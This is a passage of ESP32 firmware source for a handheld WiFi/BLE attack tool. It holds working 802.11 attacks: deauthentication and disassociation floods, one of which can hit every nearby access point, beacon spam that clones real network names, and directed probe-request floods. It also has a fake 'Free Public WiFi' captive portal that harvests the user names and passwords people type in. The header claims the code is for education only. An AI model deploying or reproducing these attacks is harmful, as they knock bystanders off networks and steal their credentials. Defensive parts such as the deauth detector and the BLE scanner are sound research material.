/*
 * UI.cpp – All screens + WiFi/BLE tool logic
 * No extra headers – everything kept here to avoid file jungle.
 * Educational / research use only. Only test networks you own.
 */

#include "UI.h"
#include "Theme.h"
#include <Arduino.h>
#include <string>
#include <string.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <NimBLEDevice.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_timer.h"
#include "esp_bt.h"

// Required so ESP32 accepts raw 802.11 TX frames (linker --wrap)
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
  return 0;
}

// Soft-AP web mode state (declared early – used by WiFi tools)
static bool webMode = false;
static void restoreWebAP();  // defined with web handlers

// ============================================================
//  WiFi Scanner
// ============================================================
#define WIFI_MAX_NETS 64

struct WifiNet {
  String  ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t ch;
  bool    hidden;
  uint8_t enc;
};

static WifiNet  wifiNets[WIFI_MAX_NETS];
static int      wifiCount = 0;
static bool     wifiScanning = false;

static void wifiScanBegin() {
  if (webMode) {
    // Keep Soft-AP up so the phone stays connected
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(false, false);  // don't kill AP
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
  }
  delay(40);
  wifiCount = 0;
  wifiScanning = false;
}

static void wifiScanStart() {
  if (wifiScanning) return;
  // Keep previous results visible until the new scan finishes
  wifiScanning = true;
  WiFi.scanDelete();
  int r = WiFi.scanNetworks(true, true);
  if (r == WIFI_SCAN_FAILED) {
    wifiScanning = false;
  }
}

static void wifiScanUpdate() {
  if (!wifiScanning) return;
  int16_t r = WiFi.scanComplete();
  if (r == WIFI_SCAN_RUNNING) return;
  wifiScanning = false;
  if (r < 0) { wifiCount = 0; return; }

  wifiCount = min((int)r, WIFI_MAX_NETS);
  for (int i = 0; i < wifiCount; i++) {
    wifiNets[i].ssid = WiFi.SSID(i);
    {
      uint8_t* b = WiFi.BSSID(i);
      if (b) memcpy(wifiNets[i].bssid, b, 6);
      else   memset(wifiNets[i].bssid, 0, 6);
    }
    wifiNets[i].rssi = WiFi.RSSI(i);
    wifiNets[i].ch   = WiFi.channel(i);
    wifiNets[i].enc  = (uint8_t)WiFi.encryptionType(i);
    wifiNets[i].hidden = (wifiNets[i].ssid.length() == 0);
    if (wifiNets[i].hidden) wifiNets[i].ssid = "<hidden>";
  }
  for (int i = 0; i < wifiCount-1; i++)
    for (int j = i+1; j < wifiCount; j++)
      if (wifiNets[j].rssi > wifiNets[i].rssi) {
        WifiNet t = wifiNets[i]; wifiNets[i] = wifiNets[j]; wifiNets[j] = t;
      }
  WiFi.scanDelete();
  if (webMode) restoreWebAP();
}

// ============================================================
//  Packet Monitor
// ============================================================
static volatile uint16_t pktCount[14];
static volatile uint32_t pktTotal = 0;
static volatile uint32_t pmMgmt = 0, pmData = 0, pmCtrl = 0, pmDeauthSeen = 0;
static volatile int8_t   pmLastRssi = 0;
static uint8_t  pmChannel = 1;
static bool     pmRunning = false;
static bool     pmHop = false;   // web can enable channel hop
static uint32_t pmLastHop = 0;

static void IRAM_ATTR pmSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA && type != WIFI_PKT_CTRL) return;
  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  if (type == WIFI_PKT_MGMT) pmMgmt++;
  else if (type == WIFI_PKT_DATA) pmData++;
  else pmCtrl++;
  // Deauth 0xC0 / Disassoc 0xA0
  if (type == WIFI_PKT_MGMT && p->rx_ctrl.sig_len >= 1) {
    uint8_t fc0 = p->payload[0];
    if (fc0 == 0xC0 || fc0 == 0xA0) pmDeauthSeen++;
  }
  pmLastRssi = p->rx_ctrl.rssi;
  if (p->rx_ctrl.channel >= 1 && p->rx_ctrl.channel <= 14) {
    pktCount[p->rx_ctrl.channel - 1]++;
    pktTotal++;
  }
}

static void pmStart() {
  memset((void*)pktCount, 0, sizeof(pktCount));
  pktTotal = 0;
  pmMgmt = pmData = pmCtrl = pmDeauthSeen = 0;
  pmLastRssi = 0;
  if (pmChannel < 1 || pmChannel > 13) pmChannel = 1;
  pmRunning = true;
  pmLastHop = millis();
  if (webMode) {
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(false, false);
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
  }
  delay(50);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&pmSniffer);
  esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
}

static void pmStop() {
  if (!pmRunning) return;
  pmRunning = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  if (webMode) restoreWebAP();
}

static void pmUpdate() {
  if (!pmRunning) return;
  if (millis() - pmLastHop >= 180) {
    pmLastHop = millis();
    if (pmHop || !webMode) {
      pmChannel++;
      if (pmChannel > 13) pmChannel = 1;
    }
    esp_wifi_set_channel(pmChannel, WIFI_SECOND_CHAN_NONE);
  }
}

// ============================================================
//  Beacon Spammer (proper frames – based on nyanBOX patterns)
// ============================================================
static bool beaconRunning = false;
static uint8_t beaconIdx = 0;
static uint32_t beaconLast = 0;
static uint8_t beaconCh = 1;
static uint8_t beaconMac[6];
static uint32_t beaconSent = 0;
static uint8_t  beaconMode = 0;  // 0 = funny list, 1 = clone scanned, 2 = custom web list
static int      beaconCloneIdx = 0;

// Web-only custom beacon SSIDs (mode 2)
static char customBeaconSSIDs[10][33];
static int  customBeaconCount = 0;
static int  customBeaconIdx = 0;

// nyanBOX-style concurrent beacon pool
#define BEACON_POOL_SIZE 10
#define BEACON_POOL_LIFE 5
struct BeaconPoolEntry {
  char ssid[33];
  uint8_t mac[6];
  bool wpa2;
  uint8_t age;
  uint8_t ch;
};
static BeaconPoolEntry beaconPool[BEACON_POOL_SIZE];
static bool beaconPoolReady = false;
static uint8_t beaconLastTxCh = 0;
static uint8_t beaconSweep = 0;

static const char* beaconSSIDs[] = {
  "Mom Use This One", "Abraham Linksys", "Benjamin FrankLAN",
  "Martin Router King", "John Wilkes Bluetooth",
  "Pretty Fly for a Wi-Fi", "Bill Wi the Science Fi",
  "I Believe Wi Can Fi", "Tell My Wi-Fi Love Her",
  "No More Mister Wi-Fi", "LAN Solo", "The LAN Before Time",
  "Silence of the LANs", "House LANister", "Winternet Is Coming",
  "Ping's Landing", "The Ping in the North", "This LAN Is My LAN",
  "Get Off My LAN", "The Promised LAN", "The LAN Down Under",
  "FBI Surveillance Van 4", "Area 51 Test Site", "Drive-By Wi-Fi",
  "Planet Express", "Wu Tang LAN", "Darude LANstorm",
  "Never Gonna Give You Up", "Hide Yo Kids, Hide Yo Wi-Fi",
  "Loading…", "Searching…", "VIRUS.EXE", "Virus-Infected Wi-Fi",
  "Starbucks Wi-Fi", "The Password Is 1234", "Free Public Wi-Fi",
  "No Free Wi-Fi Here", "Get Your Own Damn Wi-Fi", "It Hurts When IP",
  "Dora the Internet Explorer", "404 Wi-Fi Unavailable", "Porque-Fi",
  "Titanic Syncing", "Test Wi-Fi Please Ignore",
  "Drop It Like It's Hotspot", "Life in the Fast LAN",
  "Ye Olde Internet", "Lan Of The Lost", "xfinitywifi", "AndroidAP"
};
static const int BEACON_SSID_COUNT = sizeof(beaconSSIDs) / sizeof(beaconSSIDs[0]);

static void beaconRandomMac() {
  for (int i = 0; i < 6; i++) beaconMac[i] = (uint8_t)esp_random();
  beaconMac[0] = (beaconMac[0] | 0x02) & 0xFE;  // locally administered, unicast
}

static int beaconBuildFrame(uint8_t* frame, const char* ssid, uint8_t channel, bool wpa2) {
  // RSN IE for WPA2-looking beacons
  static const uint8_t rsn[] = {
    0x30, 0x18, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
    0x02, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x00, 0x0F,
    0xAC, 0x02, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
    0x00, 0x00
  };

  uint8_t* p = frame;
  *p++ = 0x80; *p++ = 0x00;           // Beacon
  *p++ = 0x00; *p++ = 0x00;           // Duration
  memset(p, 0xFF, 6); p += 6;         // Dest broadcast
  memcpy(p, beaconMac, 6); p += 6;    // Source
  memcpy(p, beaconMac, 6); p += 6;    // BSSID
  uint16_t seq = (uint16_t)((esp_random() & 0x0FFF) << 4);
  *p++ = seq & 0xFF; *p++ = (seq >> 8) & 0xFF;

  // Timestamp
  uint64_t ts = (uint64_t)esp_timer_get_time();
  memcpy(p, &ts, 8); p += 8;

  // Beacon interval (100 TU)
  *p++ = 0x64; *p++ = 0x00;
  // Capabilities: ESS + (privacy if wpa2)
  *p++ = wpa2 ? 0x11 : 0x01;
  *p++ = 0x04;

  // SSID element
  uint8_t ssidLen = (uint8_t)strnlen(ssid, 32);
  *p++ = 0x00; *p++ = ssidLen;
  memcpy(p, ssid, ssidLen); p += ssidLen;

  // Supported rates
  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x0C; *p++ = 0x12; *p++ = 0x18; *p++ = 0x24;

  // DS Parameter Set (channel)
  *p++ = 0x03; *p++ = 0x01; *p++ = channel;

  if (wpa2) {
    memcpy(p, rsn, sizeof(rsn));
    p += sizeof(rsn);
  }
  return (int)(p - frame);
}

static void beaconStart() {
  beaconRunning = true;
  beaconIdx = 0;
  beaconCloneIdx = 0;
  customBeaconIdx = 0;
  beaconLast = 0;
  beaconCh = 1;
  beaconSent = 0;
  beaconPoolReady = false;
  beaconLastTxCh = 0;
  beaconSweep = 0;
  beaconRandomMac();
  if (webMode) {
    // Keep ESP32-TYPHON AP; only change channel for TX
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32-TYPHON", "rgisking", beaconCh, 0, 4);
  } else {
    WiFi.mode(WIFI_AP);
    // minimal AP so WIFI_IF_AP exists for TX
    WiFi.softAP("esp32div", nullptr, beaconCh, 1 /* hidden */, 0);
  }
  delay(40);
  esp_wifi_set_channel(beaconCh, WIFI_SECOND_CHAN_NONE);
}

static void beaconStop() {
  beaconRunning = false;
  if (webMode) {
    restoreWebAP();
  } else {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
}

static void beaconPoolFillFunny(BeaconPoolEntry& e) {
  const char* s = beaconSSIDs[esp_random() % BEACON_SSID_COUNT];
  strncpy(e.ssid, s, 32); e.ssid[32] = 0;
  for (int i = 0; i < 6; i++) e.mac[i] = (uint8_t)esp_random();
  e.mac[0] = (e.mac[0] | 0x02) & 0xFE;
  e.wpa2 = (esp_random() % 10) < 4;
  e.age = 0;
  {
    static const uint8_t chs[] = {1, 6, 11};
    e.ch = webMode ? 1 : chs[esp_random() % 3];
  }
}
static void beaconPoolFillCustom(BeaconPoolEntry& e) {
  int idx = (customBeaconCount > 0) ? (int)(esp_random() % customBeaconCount) : 0;
  if (customBeaconCount > 0) strncpy(e.ssid, customBeaconSSIDs[idx], 32);
  else strncpy(e.ssid, "TYPHON", 32);
  e.ssid[32] = 0;
  for (int i = 0; i < 6; i++) e.mac[i] = (uint8_t)esp_random();
  e.mac[0] = (e.mac[0] | 0x02) & 0xFE;
  e.wpa2 = (esp_random() % 10) < 4;
  e.age = 0;
  e.ch = 1;
}
static void beaconPoolFillClone(BeaconPoolEntry& e) {
  if (wifiCount <= 0) { beaconPoolFillFunny(e); return; }
  int idx = (int)(esp_random() % wifiCount);
  strncpy(e.ssid, wifiNets[idx].ssid.c_str(), 32);
  e.ssid[32] = 0;
  for (int i = 0; i < 6; i++) e.mac[i] = (uint8_t)esp_random();
  e.mac[0] = (e.mac[0] | 0x02) & 0xFE;
  e.wpa2 = true;
  e.age = 0;
  e.ch = webMode ? 1 : wifiNets[idx].ch;
  if (e.ch < 1 || e.ch > 13) e.ch = 1;
}
static void beaconSendOne(const char* ssid, const uint8_t* mac, uint8_t ch, bool wpa2) {
  memcpy(beaconMac, mac, 6);
  if (ch != beaconLastTxCh) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    beaconLastTxCh = ch;
  }
  static uint8_t frame[128];
  int len = beaconBuildFrame(frame, ssid, ch, wpa2);
  if (len > 0) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
    delay(1);
    esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
    beaconSent += 2;
  }
}
static void beaconUpdate() {
  if (!beaconRunning) return;
  if (millis() - beaconLast < 20) return;
  beaconLast = millis();

  auto fill = beaconPoolFillFunny;
  if (beaconMode == 2 && customBeaconCount > 0) fill = beaconPoolFillCustom;
  else if (beaconMode == 1 && wifiCount > 0) fill = beaconPoolFillClone;

  if (!beaconPoolReady) {
    for (int i = 0; i < BEACON_POOL_SIZE; i++) fill(beaconPool[i]);
    beaconPoolReady = true;
    beaconSweep = 0;
  }

  for (int i = 0; i < BEACON_POOL_SIZE; i++) {
    beaconSendOne(beaconPool[i].ssid, beaconPool[i].mac, beaconPool[i].ch, beaconPool[i].wpa2);
    if (++beaconPool[i].age >= BEACON_POOL_LIFE) fill(beaconPool[i]);
  }

  if (!webMode) {
    if (++beaconSweep >= 20) {
      beaconSweep = 0;
      static uint8_t hop = 0;
      static const uint8_t chs[] = {1, 6, 11};
      beaconCh = chs[hop++ % 3];
      esp_wifi_set_channel(beaconCh, WIFI_SECOND_CHAN_NONE);
      beaconLastTxCh = 0;
    }
  } else {
    beaconCh = 1;
  }
}

// ============================================================
//  Deauth Detector
// ============================================================
static volatile uint32_t deauthCount = 0;
static volatile uint8_t  detLastMac[6];
static volatile int8_t   detLastRssi = 0;
static volatile uint8_t  detLastCh = 0;
static volatile bool     detMacSeen = false;
static bool detRunning = false;
static uint8_t detCh = 1;
static bool detMainOnly = true;  // hop 1/6/11 vs all 1-13

static void IRAM_ATTR detSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* payload = p->payload;
  if (p->rx_ctrl.sig_len < 24) return;
  uint8_t subtype = (payload[0] & 0xF0);
  if (subtype == 0xC0 || subtype == 0xA0) {  // deauth or disassoc
    deauthCount++;
    // addr2 = source (bytes 10-15)
    for (int i = 0; i < 6; i++) detLastMac[i] = payload[10 + i];
    detLastRssi = p->rx_ctrl.rssi;
    detLastCh = detCh;
    detMacSeen = true;
  }
}

static void detStart() {
  deauthCount = 0;
  detMacSeen = false;
  detLastRssi = 0;
  detLastCh = 0;
  memset((void*)detLastMac, 0, 6);
  detCh = 1;
  detMainOnly = true;
  detRunning = true;
  if (webMode) {
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(false, false);
  } else {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
  }
  delay(40);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&detSniffer);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}

static void detStop() {
  if (!detRunning) return;
  detRunning = false;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  if (webMode) restoreWebAP();
}

static void detUpdate() {
  if (!detRunning) return;
  static uint32_t last = 0;
  if (millis() - last > 280) {
    last = millis();
    if (detMainOnly) {
      if (detCh == 1) detCh = 6;
      else if (detCh == 6) detCh = 11;
      else detCh = 1;
    } else {
      detCh++;
      if (detCh > 13) detCh = 1;
    }
    esp_wifi_set_channel(detCh, WIFI_SECOND_CHAN_NONE);
  }
}

// ============================================================
//  Deauth Attack (stronger frame + burst – nyanBOX style)
// ============================================================
static bool deauthRunning = false;
static int  deauthTarget = -1;
static uint32_t deauthSent = 0;
static uint32_t deauthLast = 0;
static uint8_t  deauthPacket[28];

static void deauthBuild(const uint8_t* bssid, bool disassoc = false) {
  // 28-byte deauth/disassoc (broadcast to clients from AP)
  memset(deauthPacket, 0, sizeof(deauthPacket));
  deauthPacket[0] = disassoc ? 0xA0 : 0xC0;  // Disassoc or Deauth
  deauthPacket[1] = 0x00;
  deauthPacket[2] = 0x3A;
  deauthPacket[3] = 0x01;
  memset(&deauthPacket[4], 0xFF, 6);           // Dest = broadcast
  memcpy(&deauthPacket[10], bssid, 6);         // Source = AP
  memcpy(&deauthPacket[16], bssid, 6);         // BSSID = AP
  deauthPacket[22] = 0x00; deauthPacket[23] = 0x00;
  deauthPacket[24] = 0x01; deauthPacket[25] = 0x00;  // reason: unspecified
}

// Also build station->AP style (source broadcast, dest = AP) for extra pressure
static uint8_t deauthPacketRev[28];
static void deauthBuildRev(const uint8_t* bssid) {
  memset(deauthPacketRev, 0, sizeof(deauthPacketRev));
  deauthPacketRev[0] = 0xC0;
  deauthPacketRev[1] = 0x00;
  deauthPacketRev[2] = 0x3A;
  deauthPacketRev[3] = 0x01;
  memcpy(&deauthPacketRev[4], bssid, 6);       // Dest = AP
  memset(&deauthPacketRev[10], 0xFF, 6);       // Source = broadcast-ish
  memcpy(&deauthPacketRev[16], bssid, 6);      // BSSID
  deauthPacketRev[24] = 0x06; deauthPacketRev[25] = 0x00;  // reason class 2
}

static void deauthStart(int targetIdx) {
  if (targetIdx < 0 || targetIdx >= wifiCount) return;
  deauthTarget = targetIdx;
  deauthRunning = true;
  deauthSent = 0;
  deauthLast = 0;
  deauthBuild(wifiNets[targetIdx].bssid, false);
  deauthBuildRev(wifiNets[targetIdx].bssid);

  uint8_t ch = wifiNets[targetIdx].ch;
  if (ch < 1 || ch > 13) ch = 1;
  if (webMode) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32-TYPHON", "rgisking", ch, 0, 4);
  } else {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("esp32div", nullptr, ch, 1, 0);
  }
  delay(40);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

static void deauthStop() {
  deauthRunning = false;
  deauthTarget = -1;
  if (webMode) {
    restoreWebAP();
  } else {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
}

static void deauthSendBurst(const uint8_t* bssid, uint8_t ch) {
  // Always TX on the target AP channel (critical for effectiveness)
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  deauthBuild(bssid, false);
  deauthBuildRev(bssid);
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    delay(1);
    deauthSent++;
  }
  deauthBuild(bssid, true);  // disassoc
  for (int i = 0; i < 5; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    delay(1);
    deauthSent++;
  }
  for (int i = 0; i < 3; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacketRev, sizeof(deauthPacketRev), false);
    delay(1);
    deauthSent++;
  }
}
static void deauthUpdate() {
  if (!deauthRunning) return;
  if (deauthTarget == -2) {
    if (wifiCount <= 0) { deauthStop(); return; }
    // nyanBOX-style: ~5 ms cadence, cycle through all APs
    if (millis() - deauthLast < 5) return;
    deauthLast = millis();
    static int roundIdx = 0;
    if (roundIdx >= wifiCount) roundIdx = 0;
    int ti = roundIdx++;
    uint8_t ch = wifiNets[ti].ch;
    if (ch < 1 || ch > 13) ch = 1;
    deauthSendBurst(wifiNets[ti].bssid, ch);
    return;
  }
  if (deauthTarget < 0 || deauthTarget >= wifiCount) {
    deauthStop();
    return;
  }
  if (millis() - deauthLast < 5) return;
  deauthLast = millis();
  uint8_t ch = wifiNets[deauthTarget].ch;
  if (ch < 1 || ch > 13) ch = 1;
  deauthSendBurst(wifiNets[deauthTarget].bssid, ch);
}

static void deauthStartAll() {
  if (wifiCount <= 0) return;
  deauthTarget = -2;
  deauthRunning = true;
  deauthSent = 0;
  deauthLast = 0;
  if (webMode) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32-TYPHON", "rgisking", 1, 0, 4);
  } else {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("esp32div", nullptr, 1, 1, 0);
  }
  delay(40);
}

// ============================================================
//  Probe Flood – directed stress-test against one AP
// ============================================================
static bool probeRunning = false;
static int  probeTarget = -1;   // index into wifiNets (required)
static uint32_t probeSent = 0;
static uint32_t probeLast = 0;
static uint8_t  probeCh = 1;
static uint8_t  probeMac[6];
static uint8_t  probePacket[64];

static void probeRandomMac() {
  for (int i = 0; i < 6; i++) probeMac[i] = (uint8_t)esp_random();
  probeMac[0] = (probeMac[0] | 0x02) & 0xFE;
}

// Directed probe: Dest + BSSID = AP, SSID = target network name, DS channel = AP channel
static int probeBuildDirected(const char* ssid, const uint8_t* bssid, uint8_t ch) {
  memset(probePacket, 0, sizeof(probePacket));
  uint8_t* p = probePacket;
  *p++ = 0x40; *p++ = 0x00;           // Probe Request
  *p++ = 0x00; *p++ = 0x00;           // Duration
  memcpy(p, bssid, 6); p += 6;        // Dest = AP (directed)
  memcpy(p, probeMac, 6); p += 6;     // Source = fake STA
  memcpy(p, bssid, 6); p += 6;        // BSSID = AP
  *p++ = 0x00; *p++ = 0x00;           // Seq (filled loosely)
  uint8_t sl = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
  *p++ = 0x00; *p++ = sl;             // SSID IE
  if (sl) { memcpy(p, ssid, sl); p += sl; }
  *p++ = 0x01; *p++ = 0x08;           // Supported rates
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x0C; *p++ = 0x12; *p++ = 0x18; *p++ = 0x24;
  *p++ = 0x03; *p++ = 0x01; *p++ = ch; // DS Parameter Set
  return (int)(p - probePacket);
}

static void probeStart(int targetIdx) {
  if (targetIdx < 0 || targetIdx >= wifiCount) return;
  probeTarget = targetIdx;
  probeRunning = true;
  probeSent = 0;
  probeLast = 0;
  probeCh = wifiNets[targetIdx].ch;
  if (probeCh < 1 || probeCh > 13) probeCh = 1;
  probeRandomMac();
  if (webMode) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32-TYPHON", "rgisking", probeCh, 0, 4);
  } else {
    WiFi.mode(WIFI_AP);
    WiFi.softAP("esp32div", nullptr, probeCh, 1, 0);
  }
  delay(40);
  esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
}

static void probeStop() {
  probeRunning = false;
  if (webMode) {
    restoreWebAP();
  } else {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
}

static void probeUpdate() {
  if (!probeRunning) return;
  if (probeTarget < 0 || probeTarget >= wifiCount) { probeStop(); return; }
  if (millis() - probeLast < 5) return;  // aggressive stress cadence
  probeLast = millis();

  const char* ssid = wifiNets[probeTarget].ssid.c_str();
  const uint8_t* bssid = wifiNets[probeTarget].bssid;
  probeCh = wifiNets[probeTarget].ch;
  if (probeCh < 1 || probeCh > 13) probeCh = 1;

  // Occasional MAC rotation so AP sees many "clients" probing
  if ((probeSent % 40) == 0) probeRandomMac();

  int len = probeBuildDirected(ssid, bssid, probeCh);
  esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 8; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, probePacket, len, false);
    delay(1);
    probeSent++;
  }
}

// ============================================================
//  Captive Portal (basic SoftAP + DNS + simple page)
// ============================================================
static bool captiveRunning = false;
static DNSServer dnsServer;
static WebServer webServer(80);
static uint32_t captiveClients = 0;

static uint32_t captiveHits = 0;
static char captiveLastUser[32];
static char captiveLastPass[32];

static void handleCaptiveRoot() {
  captiveHits++;
  webServer.send(200, "text/html",
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Sign in</title>"
    "<style>body{font-family:system-ui;background:#111;color:#eee;text-align:center;padding:24px}"
    "input,button{width:90%;max-width:280px;padding:12px;margin:8px;border-radius:8px;border:0;font-size:16px}"
    "button{background:#0a84ff;color:#fff;font-weight:600}</style></head>"
    "<body><h2>Wi-Fi Sign In</h2>"
    "<p>Connect to the network</p>"
    "<form method='POST' action='/login'>"
    "<input name='u' placeholder='Email or username' required><br>"
    "<input name='p' type='password' placeholder='Password' required><br>"
    "<button type='submit'>Continue</button></form>"
    "<p style='opacity:.5;font-size:12px'>Demo portal – educational only</p>"
    "</body></html>");
}

static void handleCaptiveLogin() {
  captiveHits++;
  if (webServer.hasArg("u")) {
    strncpy(captiveLastUser, webServer.arg("u").c_str(), sizeof(captiveLastUser)-1);
    captiveLastUser[sizeof(captiveLastUser)-1] = 0;
  }
  if (webServer.hasArg("p")) {
    strncpy(captiveLastPass, webServer.arg("p").c_str(), sizeof(captiveLastPass)-1);
    captiveLastPass[sizeof(captiveLastPass)-1] = 0;
  }
  webServer.send(200, "text/html",
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Thanks</title></head>"
    "<body style='font-family:system-ui;text-align:center;padding:40px'>"
    "<h2>Connecting...</h2><p>Please wait</p></body></html>");
}

static void captiveStart() {
  captiveRunning = true;
  captiveClients = 0;
  captiveHits = 0;
  captiveLastUser[0] = 0;
  captiveLastPass[0] = 0;
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Free Public WiFi", "");
  delay(100);
  dnsServer.start(53, "*", WiFi.softAPIP());
  webServer.onNotFound(handleCaptiveRoot);
  webServer.on("/", handleCaptiveRoot);
  webServer.on("/login", HTTP_POST, handleCaptiveLogin);
  webServer.on("/login", HTTP_GET, handleCaptiveRoot);
  webServer.begin();
}

static void captiveStop() {
  if (!captiveRunning) return;
  captiveRunning = false;
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
}

static void captiveUpdate() {
  if (!captiveRunning) return;
  dnsServer.processNextRequest();
  webServer.handleClient();
  captiveClients = WiFi.softAPgetStationNum();
}

// ============================================================
//  Soft-AP Web UI mode  (BOOT held 2 s)
//  SSID: ESP32-TYPHON   Password: rgisking
//  Full handlers live after BLE tools (see below).
// ============================================================
static uint32_t bootHoldStart = 0;
static bool     bootWasDown = false;
static bool     webExitRequested = false;

// Forward decls for tools defined later
static void sniffStop();
static void spoofStop();
static void sourStop();
static void jamStop();
static void airTagStop();

static void restoreWebAP() {
  if (!webMode) return;
  // Keep Soft-AP alive for the browser session
  WiFi.mode(WIFI_AP);
  WiFi.softAP("ESP32-TYPHON", "rgisking");
  delay(80);
}

static void stopAllTools() {
  pmStop();
  beaconStop();
  detStop();
  deauthStop();
  probeStop();
  captiveStop();
  sniffStop();
  spoofStop();
  sourStop();
  jamStop();
  airTagStop();
  wifiScanning = false;
  restoreWebAP();
}

// Placeholder – real implementations after BLE section
static void drawWebModeScreen();
static void enterWebMode();
static void exitWebMode();
static void setupWebRoutes();
static void handleWebClients();

// ============================================================
//  BLE Scanner
// ============================================================
#define BLE_MAX_DEVS 40

struct BleDev {
  String  name;
  String  addr;
  int32_t rssi;
  uint32_t hits;
  uint32_t lastSeen;
  bool    randomized;
  bool    suspicious;
  uint8_t macChanges;
};

static BleDev   bleDevs[BLE_MAX_DEVS];
static int      bleCount = 0;
static bool     bleScanning = false;
static bool     bleReady = false;
static uint32_t bleSuspicious = 0;
static uint32_t bleFloodAlerts = 0;
static uint32_t bleNewThisScan = 0;

static bool bleIsRandomizedMac(const String& mac) {
  // First octet: random static if bits 1:0 == 11 (C0 mask style)
  if (mac.length() < 2) return false;
  char* end = nullptr;
  long v = strtol(mac.substring(0, 2).c_str(), &end, 16);
  return (v & 0xC0) == 0xC0;
}

static void bleInit() {
  if (bleReady) return;
  // Free classic BT controller RAM so NimBLE has enough heap on ESP32-WROOM
  esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
  NimBLEDevice::init("");
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  bleReady = true;
}

static int bleFindByAddr(const String& addr) {
  for (int i = 0; i < bleCount; i++)
    if (bleDevs[i].addr == addr) return i;
  return -1;
}

static void bleScanStart() {
  if (bleScanning) return;
  bleInit();
  bleNewThisScan = 0;
  bleScanning = true;
  NimBLEScan* scan = NimBLEDevice::getScan();
  scan->setActiveScan(true);
  scan->setInterval(80);
  scan->setWindow(60);
  scan->setMaxResults(BLE_MAX_DEVS);
  scan->start(5, nullptr, false);  // slightly longer dwell
}

static void bleScanUpdate() {
  if (!bleScanning) return;
  NimBLEScan* scan = NimBLEDevice::getScan();
  if (scan->isScanning()) return;
  bleScanning = false;
  NimBLEScanResults results = scan->getResults();
  uint32_t now = millis();
  int n = (int)results.getCount();
  for (int i = 0; i < n; i++) {
    NimBLEAdvertisedDevice d = results.getDevice(i);
    String addr = d.getAddress().toString().c_str();
    int idx = bleFindByAddr(addr);
    if (idx < 0) {
      if (bleCount >= BLE_MAX_DEVS) continue;
      idx = bleCount++;
      bleDevs[idx].addr = addr;
      bleDevs[idx].hits = 0;
      bleDevs[idx].macChanges = 0;
      bleDevs[idx].suspicious = false;
      bleDevs[idx].randomized = bleIsRandomizedMac(addr);
      bleNewThisScan++;
    }
    bleDevs[idx].rssi = d.getRSSI();
    bleDevs[idx].hits++;
    bleDevs[idx].lastSeen = now;
    if (d.haveName()) bleDevs[idx].name = d.getName().c_str();
    else if (bleDevs[idx].name.length() == 0) bleDevs[idx].name = addr;

    // Heuristics
    if (bleDevs[idx].hits > 80) bleDevs[idx].suspicious = true;
    if (bleDevs[idx].randomized) {
      bleDevs[idx].macChanges++;
      if (bleDevs[idx].macChanges > 6) bleDevs[idx].suspicious = true;
    }
    if (d.haveManufacturerData()) {
